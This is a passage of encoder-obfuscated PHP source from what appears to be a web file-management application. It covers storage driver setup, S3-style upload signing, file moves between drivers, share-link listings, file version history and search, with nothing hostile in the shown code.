(!$‡¸ï¤Â->isBucketCors() && !$‡¸ï¤Â->setBucketCors()) { $‰ãÅÎÁæ = LNG($Êµ‡º»‚[2178]); $‰ãÅÎÁæ .= $Êµ‡º»‚[2179] . LNG($Êµ‡º»‚[2180]); if ($™î™ºáÉ) { return $‰ãÅÎÁæ; } show_json($‰ãÅÎÁæ, !1); } } $è¾Ç‚èã = rtrim($¬Í¿Øóô[$Êµ‡º»‚[1186]], $Êµ‡º»‚[8]) . $Êµ‡º»‚[8]; $ó«ò×Ù“ = $‡¸ï¤Â->getPath($è¾Ç‚èã . $Êµ‡º»‚[1190]); if (!$‡¸ï¤Â->mkfile($ó«ò×Ù“)) { if ($™î™ºáÉ) { return LNG($Êµ‡º»‚[2178]); } show_json(LNG($Êµ‡º»‚[2178]), !1); } $¬Í¿Øóô[$Êµ‡º»‚[1186]] = $è¾Ç‚èã; $ğäòİ‘¿[$Êµ‡º»‚[6]] = json_encode($¬Í¿Øóô); $ğäòİ‘¿[$Êµ‡º»‚[95]] = $ãŠª¯á•; return !0; } public function driverListSystem() { $çÎ…ôÉÔ =& $_SERVER[Ì¥ŞÒ°£]; $„Ç«¸ìí = parent::listData(); $Şü¤ßš = array(); foreach ($„Ç«¸ìí as $¯Şî•†Î) { unset($¯Şî•†Î[$çÎ…ôÉÔ[200]], $¯Şî•†Î[$çÎ…ôÉÔ[85]]); $¯Şî•†Î[$çÎ…ôÉÔ[6]] = json_decode($¯Şî•†Î[$çÎ…ôÉÔ[6]], !0); $Şü¤ßš[] = $¯Şî•†Î; } return $Şü¤ßš; } public function defaultDriver() { $½ª£öÀÑ =& $_SERVER[Ì¥ŞÒ°£]; $¬éû²¿† = parent::listData(); $ÑÎ‡õ· = array_filter_by_field($¬éû²¿†, $½ª£öÀÑ[37], 1); $ÑÎ‡õ· = $ÑÎ‡õ·[0]; if ($ÑÎ‡õ·) { $ÑÎ‡õ·[$½ª£öÀÑ[6]] = json_decode($ÑÎ‡õ·[$½ª£öÀÑ[6]], !0); } return $ÑÎ‡õ·; } public function driverInfo($Üô´…óˆ) { $éÜ¥Äóõ =& $_SERVER[Ì¥ŞÒ°£]; $Šµ»¯â” = array_to_keyvalue(parent::listData(), $éÜ¥Äóõ[399]); if (!isset($Šµ»¯â”[$Üô´…óˆ])) { return !1; } $•ÜúÃµÃ = $Šµ»¯â”[$Üô´…óˆ]; $•ÜúÃµÃ[$éÜ¥Äóõ[6]] = json_decode($•ÜúÃµÃ[$éÜ¥Äóõ[6]], !0); return $•ÜúÃµÃ; } public function remove($Ì«Æ—æŒ) { $this->removeShareItems($Ì«Æ—æŒ); return parent::remove($Ì«Æ—æŒ); } public function removeWithFile($‡ã¥”ç°, $Ğü‘ñ©ò) { $°·êî“° =& $_SERVER[Ì¥ŞÒ°£]; $ô¶úİ•ä = array($°·êî“°[819] => $‡ã¥”ç°); $í¤¶ËÏÉ = Model($°·êî“°[471])->where($ô¶úİ•ä)->count(); $«Èî–¤ = Model($°·êî“°[471])->where($ô¶úİ•ä)->sum($°·êî“°[76]); $ğÊ‡‘ô© = $Ğü‘ñ©ò . $°·êî“°[2181] . $‡ã¥”ç°; $£âıÊ™ = LNG($Ğü‘ñ©ò == $°·êî“°[557] ? $°·êî“°[2182] : $°·êî“°[2183]); $Ó¬ÖÃê = new TaskFileTransfer($ğÊ‡‘ô©, $°·êî“°[2177], $í¤¶ËÏÉ, $£âıÊ™ . "\x28{$‡ã¥”ç°}\51"); $Ó¬ÖÃê->task[$°·êî“°[765]] = (double) $«Èî–¤; $È„‰ªİô = KodIO::defaultDriver(); $¸…ƒÆ¯¯ = $È„‰ªİô[$°·êî“°[399]]; $¤ê–ì = "\x7b\151\x6f\72{$¸…ƒÆ¯¯}\175\x2f"; $µÍ—”«ô = !0; $÷Öªèš² = array(); $‡ ­ùŸ = Model($°·êî“°[199])->where($ô¶úİ•ä)->field($°·êî“°[2184])->select(); foreach ($‡ ­ùŸ as $–ß÷¢’) { $õ³Û‹ˆ = $–ß÷¢’[$°·êî“°[84]]; $é¿¾ì€ = $¤ê–ì . str_replace("\x7b\x69\157\x3a{$‡ã¥”ç°}\175\x2f", $°·êî“°[12], $õ³Û‹ˆ); if (!IO::exist($õ³Û‹ˆ)) { $÷Öªèš²[] = $–ß÷¢’[$°·êî“°[468]]; $Ó¬ÖÃê->updateFileEnd($–ß÷¢’[$°·êî“°[32]], $–ß÷¢’[$°·êî“°[76]]); continue; } if (IO::exist($é¿¾ì€)) { $Ó¬ÖÃê->updateFileEnd($–ß÷¢’[$°·êî“°[32]], $–ß÷¢’[$°·êî“°[76]]); continue; } if (!IO::move($õ³Û‹ˆ, get_path_father($é¿¾ì€))) { $µÍ—”«ô = !1; break; } $ô¶úİ•ä = array($°·êî“°[468] => $–ß÷¢’[$°·êî“°[468]]); $ÔÂüßŠİ = array($°·êî“°[819] => $¸…ƒÆ¯¯, $°·êî“°[84] => $é¿¾ì€); Model($°·êî“°[199])->where($ô¶úİ•ä)->save($ÔÂüßŠİ); } $this->removeByFileID($÷Öªèš²); if (!$µÍ—”«ô) { $Ó¬ÖÃê->stop($ğÊ‡‘ô©); return !1; } $Ó¬ÖÃê->end(); if ($Ğü‘ñ©ò == $°·êî“°[1826]) { $this->remove($‡ã¥”ç°); } } public function progress($€Å‘À€™, $…„•ËÙƒ) { return Task::get($…„•ËÙƒ . $_SERVER[Ì¥ŞÒ°£][2181] . $€Å‘À€™); } private function removeByFileID($áú‡ÔÅ£ = array()) { $ƒ’Õ³œä =& $_SERVER[Ì¥ŞÒ°£]; if (empty($áú‡ÔÅ£)) { return; } $  †©ÖÔ = array($ƒ’Õ³œä[468] => array($ƒ’Õ³œä[7], $áú‡ÔÅ£)); $˜£ùÙÊ› = Model($ƒ’Õ³œä[1341])->where($  †©ÖÔ)->field($ƒ’Õ³œä[402])->select(); if (!$˜£ùÙÊ›) { return; } $˜£ùÙÊ› = array_to_keyvalue($˜£ùÙÊ›, $ƒ’Õ³œä[12], $ƒ’Õ³œä[402]); foreach ($˜£ùÙÊ› as $ŠÖÓ“¹Ö) { Model($ƒ’Õ³œä[416])->removeNow($ŠÖÓ“¹Ö, !1); } } private function removeShareItems($½Ë¥ª‰Ğ) { $Ùø¦à›¦ =& $_SERVER[Ì¥ŞÒ°£]; $¨Ø·€Õú = "\173\x69\x6f\x3a{$½Ë¥ª‰Ğ}\175\57"; $Ëƒ¼Í¬ = array($Ùø¦à›¦[402] => 0, $Ùø¦à›¦[1181] => array($Ùø¦à›¦[383], "{$¨Ø·€Õú}\45")); $ÌÓ¼ïõ = Model($Ùø¦à›¦[1837])->where($Ëƒ¼Í¬)->field($Ùø¦à›¦[489])->select(); if (empty($ÌÓ¼ïõ)) { return; } $÷÷®£ = array_to_keyvalue($ÌÓ¼ïõ, $Ùø¦à›¦[12], $Ùø¦à›¦[489]); Model($Ùø¦à›¦[601])->remove($÷÷®£); } } goto béÔõ©éŞ—; aÍ‰±™¦ê: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($ë¬›í±Â) { $this->pathParse = $ë¬›í±Â; } protected function infoParse($È¡—İ®, $ı·ê„ò = false) { $÷èó·†Ÿ =& $_SERVER[Ì¥ŞÒ°£]; return Action($÷èó·†Ÿ[1180])->sharePathInfo($this->pathParse[$÷èó·†Ÿ[84]], !0, $ı·ê„ò); } public function listPath($×³£¬œ, $ÊÓ‰Ñ»¯ = false) { $¥Ûö´œ =& $_SERVER[Ì¥ŞÒ°£]; $®ÀâÓ·¿ = IO::listPath($×³£¬œ, $ÊÓ‰Ñ»¯); if (!$®ÀâÓ·¿) { return $®ÀâÓ·¿; } if (is_array($®ÀâÓ·¿[$¥Ûö´œ[1350]])) { $ ·¯ì’´ = Action($¥Ûö´œ[1359])->parsePathChildren($®ÀâÓ·¿[$¥Ûö´œ[1350]], array($¥Ûö´œ[421] => $×³£¬œ)); $®ÀâÓ·¿[$¥Ûö´œ[1350]] = Action($¥Ûö´œ[1180])->shareItemInfo($ ·¯ì’´); } foreach ($®ÀâÓ·¿ as $ÔƒÚÒçÓ => $Ã­øüÆ¹) { if (!in_array($ÔƒÚÒçÓ, array($¥Ûö´œ[83], $¥Ûö´œ[82]))) { continue; } foreach ($Ã­øüÆ¹ as $ØÇÎºÏÒ => $ ·¯ì’´) { $ ·¯ì’´ = Action($¥Ûö´œ[1359])->parsePathChildren($ ·¯ì’´, array($¥Ûö´œ[421] => $×³£¬œ)); $®ÀâÓ·¿[$ÔƒÚÒçÓ][$ØÇÎºÏÒ] = Action($¥Ûö´œ[1180])->shareItemInfo($ ·¯ì’´); } } return $®ÀâÓ·¿; } public function listAll($âïö¹Â¡) { $°µùøùä =& $_SERVER[Ì¥ŞÒ°£]; $€İšÒŞş = IO::listAll($âïö¹Â¡); foreach ($€İšÒŞş as &$¶Ç®¬Ö¾) { $ú›ÇßØ¸ = IO::info($¶Ç®¬Ö¾[$°µùøùä[84]]); $ú›ÇßØ¸ = is_array($ú›ÇßØ¸) ? $ú›ÇßØ¸ : array(); $¶Ç®¬Ö¾ = array_merge($ú›ÇßØ¸, $¶Ç®¬Ö¾); $¶Ç®¬Ö¾[$°µùøùä[86]] = Action($°µùøùä[1180])->shareItemInfo($¶Ç®¬Ö¾); } unset($¶Ç®¬Ö¾); return $€İšÒŞş; } } class PathDriverEDS extends PathDriverMinIO { public function __construct($ºî÷í„ı) { parent::__construct($ºî÷í„ı); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($Ó×á±Æö) { parent::__construct($Ó×á±Æö); $this->signatureVersion($_SERVER[Ì¥ŞÒ°£][216]); } public function uploadFormData($ƒ‡Û­¦Æ, $¥Ä£ßõ¤ = 3600) { $ò¶ïÈÊ— =& $_SERVER[Ì¥ŞÒ°£]; $À•ñ¶ç§ = $ò¶ïÈÊ—[198]; $ŠĞ×š³˜ = $ò¶ïÈÊ—[1360]; $ô³ãÍŒ¢ = $ò¶ïÈÊ—[62]; $Š¥²µ¸À = gmdate($ò¶ïÈÊ—[1361]); $¬¾éãàÉ = gmdate($ò¶ïÈÊ—[753]); $§âôœ‹š = $ò¶ïÈÊ—[1362]; $®ìÂ÷Ôî = $¥Ä£ßõ¤ . $ò¶ïÈÊ—[12]; $î¤¨®® = $ò¶ïÈÊ—[1324]; $éËÊ¬ÓÃ = array($this->accessKey, $¬¾éãàÉ, $this->region, $ô³ãÍŒ¢, $§âôœ‹š); $‰¹‡‹´ = implode($ò¶ïÈÊ—[8], $éËÊ¬ÓÃ); $Ôë¿Ÿâè = array($ò¶ïÈÊ—[1326] => gmdate($ò¶ïÈÊ—[1325], strtotime($ò¶ïÈÊ—[1363])), $ò¶ïÈÊ—[1327] => array(array($ò¶ïÈÊ—[1329] => $this->bucket), array($ò¶ïÈÊ—[1328] => $À•ñ¶ç§), array($ò¶ïÈÊ—[1330], $ò¶ïÈÊ—[1331], $ò¶ïÈÊ—[12]), array($ò¶ïÈÊ—[1330], $ò¶ïÈÊ—[1364], $ò¶ïÈÊ—[12]), array($ò¶ïÈÊ—[1330], $ò¶ïÈÊ—[1365], $ò¶ïÈÊ—[12]), array($ò¶ïÈÊ—[1332] => $î¤¨®®), array($ò¶ïÈÊ—[1366] => $‰¹‡‹´), array($ò¶ïÈÊ—[1367] => $ŠĞ×š³˜), array($ò¶ïÈÊ—[1368] => $Š¥²µ¸À), array($ò¶ïÈÊ—[1369] => $®ìÂ÷Ôî))); $£Ã†¹Òõ = base64_encode(json_encode($Ôë¿Ÿâè)); $º–çª = hash_hmac($ò¶ïÈÊ—[1370], $¬¾éãàÉ, $ò¶ïÈÊ—[1371] . $this->secret, !0); $êÅù×ò = hash_hmac($ò¶ïÈÊ—[1370], $this->region, $º–çª, !0); $ÇÉçáê = hash_hmac($ò¶ïÈÊ—[1370], $ô³ãÍŒ¢, $êÅù×ò, !0); $Äìˆ²ß = hash_hmac($ò¶ïÈÊ—[1370], $§âôœ‹š, $ÇÉçáê, !0); $æÑİô¼¼ = hash_hmac($ò¶ïÈÊ—[1370], $£Ã†¹Òõ, $Äìˆ²ß); $ÜğĞ»§… = array($ò¶ïÈÊ—[215] => $ò¶ïÈÊ—[12], $ò¶ïÈÊ—[1372] => $ò¶ïÈÊ—[12], $ò¶ïÈÊ—[1328] => $À•ñ¶ç§, $ò¶ïÈÊ—[1332] => $î¤¨®®, $ò¶ïÈÊ—[1336] => $£Ã†¹Òõ, $ò¶ïÈÊ—[1373] => $‰¹‡‹´, $ò¶ïÈÊ—[1374] => $ŠĞ×š³˜, $ò¶ïÈÊ—[1375] => $Š¥²µ¸À, $ò¶ïÈÊ—[1376] => $®ìÂ÷Ôî, $ò¶ïÈÊ—[1377] => $æÑİô¼¼, $ò¶ïÈÊ—[181] => $this->getHost()); return $ÜğĞ»§…; } } goto F††ß…´÷›; aïëÀñ„±: class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\x6f\137\x73\157\x75\162\x63\x65\137\150\x69\163\164\x6f\x72\171"; public function historyCount($‹š¨¶ìÓ) { $ñ¯ÛÂ =& $_SERVER[Ì¥ŞÒ°£]; if (!$‹š¨¶ìÓ) { return array(); } if (is_string($‹š¨¶ìÓ) || is_int($‹š¨¶ìÓ)) { $‹š¨¶ìÓ = array($‹š¨¶ìÓ); } $üü‚‰±¯ = array($ñ¯ÛÂ[402], $ñ¯ÛÂ[1890] => $ñ¯ÛÂ[500]); $”Áº¬ñÙ = array($ñ¯ÛÂ[402] => array($ñ¯ÛÂ[7], $‹š¨¶ìÓ)); $ÒíŸóÙÚ = $this->field($üü‚‰±¯)->where($”Áº¬ñÙ)->group($ñ¯ÛÂ[402])->select(); return array_to_keyvalue($ÒíŸóÙÚ, $ñ¯ÛÂ[402], $ñ¯ÛÂ[500]); } public function addHistory($©‘ÔÜ€, $Õ€Ÿ‡éí = '') { $ù„ñÄÀ =& $_SERVER[Ì¥ŞÒ°£]; $ìó×¡ë€ = array($ù„ñÄÀ[417] => $©‘ÔÜ€[$ù„ñÄÀ[402]], $ù„ñÄÀ[1658] => isset($©‘ÔÜ€[$ù„ñÄÀ[456]]) ? $©‘ÔÜ€[$ù„ñÄÀ[456]] : $©‘ÔÜ€[$ù„ñÄÀ[454]], $ù„ñÄÀ[469] => $©‘ÔÜ€[$ù„ñÄÀ[468]], $ù„ñÄÀ[585] => $©‘ÔÜ€[$ù„ñÄÀ[76]], $ù„ñÄÀ[2096] => $Õ€Ÿ‡éí); if ($GLOBALS[$ù„ñÄÀ[6]][$ù„ñÄÀ[89]][$ù„ñÄÀ[1223]] >= 1) { $this->historyAutoClear($ìó×¡ë€[$ù„ñÄÀ[402]]); $this->add($ìó×¡ë€); } Hook::trigger($ù„ñÄÀ[2097], $ìó×¡ë€); Model($ù„ñÄÀ[2098])->eventFileEdit($©‘ÔÜ€[$ù„ñÄÀ[402]]); } private function historyAutoClear($°Ò½¸©’) { $Ïñ¼…¯ =& $_SERVER[Ì¥ŞÒ°£]; $ÉÀò›™— = Model($Ïñ¼…¯[772])->get($Ïñ¼…¯[1245]); $‚ñë¢‚ = $GLOBALS[$Ïñ¼…¯[6]][$Ïñ¼…¯[89]][$Ïñ¼…¯[1223]]; $ó§è­´ = $ÉÀò›™— == $Ïñ¼…¯[1246] ? min(5, $‚ñë¢‚) : $‚ñë¢‚; $ó§è­´ = $ó§è­´ <= 0 ? 0 : $ó§è­´ - 1; if ($ó§è­´ >= 500) { return; } $ÌğöÑàë = array($Ïñ¼…¯[417] => $°Ò½¸©’); $®¬şš¹É = $this->field($Ïñ¼…¯[2099])->where($ÌğöÑàë)->order($Ïñ¼…¯[2093])->select(); if (!$®¬şš¹É || $ó§è­´ >= count($®¬şš¹É)) { return; } $í´‘á  = array_to_keyvalue($®¬şš¹É, $Ïñ¼…¯[12], $Ïñ¼…¯[399]); $í´‘á  = array_slice($í´‘á , $ó§è­´); $³Á®¶Î = array_to_keyvalue($®¬şš¹É, $Ïñ¼…¯[12], $Ïñ¼…¯[468]); $³Á®¶Î = array_slice($³Á®¶Î, $ó§è­´); if (!$í´‘á  || !$³Á®¶Î) { return; } $ÌğöÑàë = array($Ïñ¼…¯[419] => array($Ïñ¼…¯[7], $í´‘á )); $this->where($ÌğöÑàë)->delete(); Model($Ïñ¼…¯[471])->remove($³Á®¶Î); } public function listData($şÒ˜ƒªø) { $şÊŠÛ³¥ =& $_SERVER[Ì¥ŞÒ°£]; $É“Â­¸Õ = array($şÊŠÛ³¥[417] => $şÒ˜ƒªø); $ˆòçŞÍÌ = $şÊŠÛ³¥[2100]; $¬‘°É½ = $this->field($ˆòçŞÍÌ)->where($É“Â­¸Õ)->order($şÊŠÛ³¥[2093])->selectPage(); $this->_listAppendUser($¬‘°É½[$şÊŠÛ³¥[369]]); $ê¤ ¤­µ = Model($şÊŠÛ³¥[772])->get($şÊŠÛ³¥[1245]); $’¨ğˆÖ­ = 5; if ($ê¤ ¤­µ == $şÊŠÛ³¥[1246]) { $¬‘°É½[$şÊŠÛ³¥[369]] = array_slice($¬‘°É½[$şÊŠÛ³¥[369]], 0, $’¨ğˆÖ­); $¬‘°É½[$şÊŠÛ³¥[366]] = array($şÊŠÛ³¥[2101] => 1, $şÊŠÛ³¥[2102] => 20, $şÊŠÛ³¥[2103] => 1, $şÊŠÛ³¥[2104] => count($¬‘°É½[$şÊŠÛ³¥[369]])); } return $¬‘°É½; } protected function _listAppendUser(&$»Ó¬œÏ€) { $­®àØâ« =& $_SERVER[Ì¥ŞÒ°£]; $ÖòñÉßş = array_to_keyvalue($»Ó¬œÏ€, $­®àØâ«[12], $­®àØâ«[1667]); $íÉ­…É£ = Model($­®àØâ«[535])->userListInfo($ÖòñÉßş); foreach ($»Ó¬œÏ€ as &$ô´¯›†) { $í×ï¾È¨ = $ô´¯›†[$­®àØâ«[1667]]; $ô´¯›†[$­®àØâ«[454]] = $íÉ­…É£[$í×ï¾È¨] ? $íÉ­…É£[$í×ï¾È¨] : !1; } unset($ô´¯›†); } public function fileInfo($è§ûŠ¹ò) { $Ôïõğô” =& $_SERVER[Ì¥ŞÒ°£]; $„ó­‚òã = $this->tablePrefix; $È±û¥ˆ± = "{$„ó­‚òã}\x69\x6f\137\146\x69\154\x65\40\146\151\154\145\163\40\x6f\156\x20\x66\151\x6c\145\x73\56\146\151\x6c\145\111\x44\x20\75\x20\x68\151\x73\x74\157\x72\171\56\146\151\x6c\145\x49\x44"; return $this->alias($Ôïõğô”[2105])->where(array($Ôïõğô”[419] => $è§ûŠ¹ò))->join($È±û¥ˆ±, $Ôïõğô”[2106])->find(); } public function removeItem($ûµıÆëû) { $£íŠÕô— =& $_SERVER[Ì¥ŞÒ°£]; $äşÍ¸™ = array($£íŠÕô—[419] => $ûµıÆëû); $™ŒæèßÃ = $this->where($äşÍ¸™)->find(); if ($™ŒæèßÃ) { $ÅõüÈš™ = $this->where($äşÍ¸™)->delete(); Model($£íŠÕô—[471])->remove($™ŒæèßÃ[$£íŠÕô—[468]]); return $ÅõüÈš™; } return !1; } public function removeBySource($¶Ü÷İÙš) { $ÑŞ¥’„Ê =& $_SERVER[Ì¥ŞÒ°£]; if (!$¶Ü÷İÙš) { return !1; } if (!is_array($¶Ü÷İÙš)) { $¶Ü÷İÙš = array($¶Ü÷İÙš); } $ñŞı†„  = array($ÑŞ¥’„Ê[417] => array($ÑŞ¥’„Ê[7], $¶Ü÷İÙš)); $®¨ª»Ü» = $this->field($ÑŞ¥’„Ê[469])->where($ñŞı†„ )->select(); if ($®¨ª»Ü») { $this->where($ñŞı†„ )->delete(); $Œçšø¾ = array_to_keyvalue($®¨ª»Ü», $ÑŞ¥’„Ê[12], $ÑŞ¥’„Ê[468]); Model($ÑŞ¥’„Ê[471])->remove($Œçšø¾); } return !0; } public function setDetail($¢ı°ÙïÎ, $îÚ¦Ôı) { $©¶İì­Ã =& $_SERVER[Ì¥ŞÒ°£]; return $this->where(array($©¶İì­Ã[419] => $¢ı°ÙïÎ))->save(array($©¶İì­Ã[2096] => $îÚ¦Ôı)); } public function rollbackToItem($¹œ¶¹Æ‡, $„óº—¸) { $Û¼¦íèŸ =& $_SERVER[Ì¥ŞÒ°£]; $ªáäÂãº = Model($Û¼¦íèŸ[827])->sourceInfo($¹œ¶¹Æ‡); $this->addHistory($ªáäÂãº, LNG($Û¼¦íèŸ[2107])); $Ë¥ÈáŒø = $this->find($„óº—¸); $¤ø¥ç¡‘ = array($Û¼¦íèŸ[468] => $Ë¥ÈáŒø[$Û¼¦íèŸ[468]], $Û¼¦íèŸ[76] => $Ë¥ÈáŒø[$Û¼¦íèŸ[76]], $Û¼¦íèŸ[85] => time(), $Û¼¦íèŸ[456] => USER_ID); Model($Û¼¦íèŸ[827])->where(array($Û¼¦íèŸ[402] => $¹œ¶¹Æ‡))->save($¤ø¥ç¡‘); return $this->where(array($Û¼¦íèŸ[419] => $„óº—¸))->delete(); } public function clearSame($°–Äœ™) { $µÛˆŒ†‹ =& $_SERVER[Ì¥ŞÒ°£]; $±Ö’Ô“Ç = $this->listData($°–Äœ™); $şÄŠÊ¹à = array_to_keyvalue_group($±Ö’Ô“Ç, $µÛˆŒ†‹[468]); $„×Óş„ = array(); $äúàè¦ù = array(); foreach ($şÄŠÊ¹à as $“¹â½Ğ) { if (!$“¹â½Ğ || count($“¹â½Ğ) <= 1) { continue; } foreach ($“¹â½Ğ as $È£şˆè) { $„×Óş„[] = $È£şˆè[$µÛˆŒ†‹[468]]; $äúàè¦ù[] = $È£şˆè[$µÛˆŒ†‹[399]]; } } if (!$äúàè¦ù) { return; } $this->where(array($µÛˆŒ†‹[399] => array($µÛˆŒ†‹[7], $äúàè¦ù)))->delete(); Model($µÛˆŒ†‹[471])->remove($„×Óş„); } public function userSpace() { $ŠáŒªå¯ =& $_SERVER[Ì¥ŞÒ°£]; $Œùã÷Ø£ = $this->tablePrefix; $„ŞÙ±«Ç = array($ŠáŒªå¯[1658] => USER_ID); $¹³Öçí‹ = "{$Œùã÷Ø£}\151\157\x5f\146\x69\154\x65\40\x66\151\154\x65\x73\x20\157\156\x20\146\x69\154\x65\163\x2e\x66\x69\x6c\x65\x49\x44\x20\x3d\x20\x68\x69\x73\164\157\x72\x79\x2e\x66\x69\x6c\x65\111\104"; return $this->alias($ŠáŒªå¯[2105])->where($„ŞÙ±«Ç)->join($¹³Öçí‹, $ŠáŒªå¯[2106])->sum($ŠáŒªå¯[76]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($¦Û˜¦‚Ô) { $³â— Áˆ =& $_SERVER[Ì¥ŞÒ°£]; $òØé²ÒÆ = KodIO::fileTypeList(); $ÍÍÖôÄæ = $òØé²ÒÆ[$¦Û˜¦‚Ô]; if (!$ÍÍÖôÄæ) { return array(); } $µµ¦øŠñ = $ÍÍÖôÄæ[$³â— Áˆ[174]]; $„§¼¶Å = $³â— Áˆ[7]; if (!$ÍÍÖôÄæ[$³â— Áˆ[174]]) { $ÃÛÔ˜Ş¼ = array_to_keyvalue($òØé²ÒÆ, $³â— Áˆ[12], $³â— Áˆ[174]); $µµ¦øŠñ = implode($³â— Áˆ[50], $ÃÛÔ˜Ş¼); $„§¼¶Å = $³â— Áˆ[2108]; } $½ÍÜºÒ = explode($³â— Áˆ[50], trim($µµ¦øŠñ, $³â— Áˆ[50])); return array($„§¼¶Å, $½ÍÜºÒ); } public function listPathType($öºªˆ¨—) { $ª‰ÏéÖ =& $_SERVER[Ì¥ŞÒ°£]; $»¶¿¤ÅÂ = $this->fileTypeWhere($öºªˆ¨—); if (!$»¶¿¤ÅÂ) { return array(); } $Œ¡À¸£– = USER_ID; $Û•×÷¹å = Model($ª‰ÏéÖ[535])->getInfo($Œ¡À¸£–); $£×”ìâ  = array($ª‰ÏéÖ[586] => SourceModel::TYPE_USER, $ª‰ÏéÖ[521] => array($ª‰ÏéÖ[550], $ª‰ÏéÖ[531] . $Û•×÷¹å[$ª‰ÏéÖ[86]][$ª‰ÏéÖ[402]] . $ª‰ÏéÖ[551]), $ª‰ÏéÖ[587] => $Œ¡À¸£–, $ª‰ÏéÖ[583] => 0, $ª‰ÏéÖ[584] => $»¶¿¤ÅÂ); return $this->listSource($£×”ìâ ); } public function listSearch($·´¡Ãû‚, $“”§Å´¯ = 300) { $ÅàÕª… =& $_SERVER[Ì¥ŞÒ°£]; if (isset($·´¡Ãû‚[$ÅàÕª…[1951]]) && $·´¡Ãû‚[$ÅàÕª…[1951]]) { $·´¡Ãû‚[$ÅàÕª…[1951]] = str_replace($ÅàÕª…[384], $ÅàÕª…[2109], trim($·´¡Ãû‚[$ÅàÕª…[1951]])); } $ğ¸ñ¤Õó = $this->_parseSearchWhere($·´¡Ãû‚); if (!isset($ğ¸ñ¤Õó[$ÅàÕª…[431]])) { $ğ¸ñ¤Õó[$ÅàÕª…[431]] = 0; } $‰¡óµŠÅ = $ÅàÕª…[2110]; $¼ø¸©Ş… = $ğ¸ñ¤Õó; $ĞñÁ˜öº = $‰¡óµŠÅ; $this->_listSearchBindPinyin($·´¡Ãû‚, $ğ¸ñ¤Õó, $‰¡óµŠÅ); $this->alias($ÅàÕª…[446])->_makeOrder(); $ğ¸ñ¤Õó = $this->parseWhereLike($ğ¸ñ¤Õó); $»‹ßŒí´ = $this->distinct(!0)->field($‰¡óµŠÅ)->where($ğ¸ñ¤Õó)->selectPage($“”§Å´¯); if ($GLOBALS[$ÅàÕª…[6]][$ÅàÕª…[381]][$ÅàÕª…[382]] && Input::check($·´¡Ãû‚[$ÅàÕª…[1951]], $ÅàÕª…[593]) && $»‹ßŒí´[$ÅàÕª…[366]][$ÅàÕª…[353]] == 1 && $»‹ßŒí´[$ÅàÕª…[366]][$ÅàÕª…[367]] == 0) { $»‹ßŒí´ = $this->distinct(!0)->field($‰¡óµŠÅ)->where($¼ø¸©Ş…)->limit(1000)->select(); $»‹ßŒí´ = array_page_split($»‹ßŒí´, !1, $“”§Å´¯); } $this->_listSearchFileContent($»‹ßŒí´, $·´¡Ãû‚, $ĞñÁ˜öº, $¼ø¸©Ş…); $this->_listSearchDesc($»‹ßŒí´, $·´¡Ãû‚, $ĞñÁ˜öº); $this->_listSearchTag($»‹ßŒí´, $·´¡Ãû‚, $ĞñÁ˜öº); $this->_listSearchGroupTag($»‹ßŒí´, $·´¡Ãû‚, $ĞñÁ˜öº); $this->_listDataApply($»‹ßŒí´[$ÅàÕª…[369]]); $this->_listMake($»‹ßŒí´); return $»‹ßŒí´; } private function _listSearchFileContent(&$ªÑöÆÈé, $®çŞúÌá, $çĞ®¯ó, $¹ĞÚÙûı) { $‘ÖúŞ =& $_SERVER[Ì¥ŞÒ°£]; if (!$®çŞúÌá[$‘ÖúŞ[1951]] || $ªÑöÆÈé[$‘ÖúŞ[366]][$‘ÖúŞ[353]] > 1) { return; } if (!isset($¹ĞÚÙûı[$‘ÖúŞ[32]]) || !is_array($®çŞúÌá[$‘ÖúŞ[468]])) { return; } $¹ĞÚÙûı[$‘ÖúŞ[468]] = array($‘ÖúŞ[7], $®çŞúÌá[$‘ÖúŞ[468]]); unset($¹ĞÚÙûı[$‘ÖúŞ[32]]); unset($®çŞúÌá[$‘ÖúŞ[468]]); $­Ï¡®»ó = $this->field($çĞ®¯ó)->where($¹ĞÚÙûı)->limit($‘ÖúŞ[2111])->select(); if (!$­Ï¡®»ó || count($­Ï¡®»ó) == 0) { return; } $ªÑöÆÈé[$‘ÖúŞ[369]] = array_merge($­Ï¡®»ó, $ªÑöÆÈé[$‘ÖúŞ[369]]); $ªÑöÆÈé[$‘ÖúŞ[366]][$‘ÖúŞ[367]] += count($­Ï¡®»ó); } private function _listSearchTag(&$Ş™ö¿, $ºó»×‚€, $ñë…®Èè) { $Ô¾éò¤ =& $_SERVER[Ì¥ŞÒ°£]; if (!$ºó»×‚€[$Ô¾éò¤[1951]] || $Ş™ö¿[$Ô¾éò¤[366]][$Ô¾éò¤[353]] > 1) { return; } $Áøœ€½Ó = Model($Ô¾éò¤[2112])->listData(); $ÓÄşÑ„ = array(); $ñŠ‚¿ÜÑ = $ºó»×‚€[$Ô¾éò¤[1951]]; foreach ($Áøœ€½Ó as $˜ˆôì±¡) { $”Ôú‹“Ÿ = $˜ˆôì±¡[$Ô¾éò¤[32]]; $Ì±¹â = str_replace($Ô¾éò¤[53], $Ô¾éò¤[12], Pinyin::get($”Ôú‹“Ÿ)); if (stripos($”Ôú‹“Ÿ, $ñŠ‚¿ÜÑ) !== !1 || stripos($Ì±¹â, $ñŠ‚¿ÜÑ) !== !1) { $ÓÄşÑ„[] = $˜ˆôì±¡[$Ô¾éò¤[399]]; } } if (!$ÓÄşÑ„) { return; } $³ÅÒ¿Ò… = array($Ô¾éò¤[426] => array($Ô¾éò¤[7], $ÓÄşÑ„), $Ô¾éò¤[1667] => USER_ID); $©µºÇù¹ = Model($Ô¾éò¤[428])->field($Ô¾éò¤[84])->where($³ÅÒ¿Ò…)->select(); $©µºÇù¹ = array_to_keyvalue($©µºÇù¹, $Ô¾éò¤[12], $Ô¾éò¤[84]); $‰è–“ = array_unique($©µºÇù¹); $this->_listSearchMerge($Ş™ö¿, $ºó»×‚€, $ñë…®Èè, $‰è–“); } private function _listSearchDesc(&$Ğº÷Ø™ı, $ÆèËÎ³ß, $¢˜¡¿äÊ) { $ÖëÙ®Ü‰ =& $_SERVER[Ì¥ŞÒ°£]; if (!$ÆèËÎ³ß[$ÖëÙ®Ü‰[1951]] || $Ğº÷Ø™ı[$ÖëÙ®Ü‰[366]][$ÖëÙ®Ü‰[353]] > 1) { return; } $ôÍÚª¨ = array($ÖëÙ®Ü‰[94] => $ÖëÙ®Ü‰[453], $ÖëÙ®Ü‰[374] => array($ÖëÙ®Ü‰[383], $ÖëÙ®Ü‰[1953] . 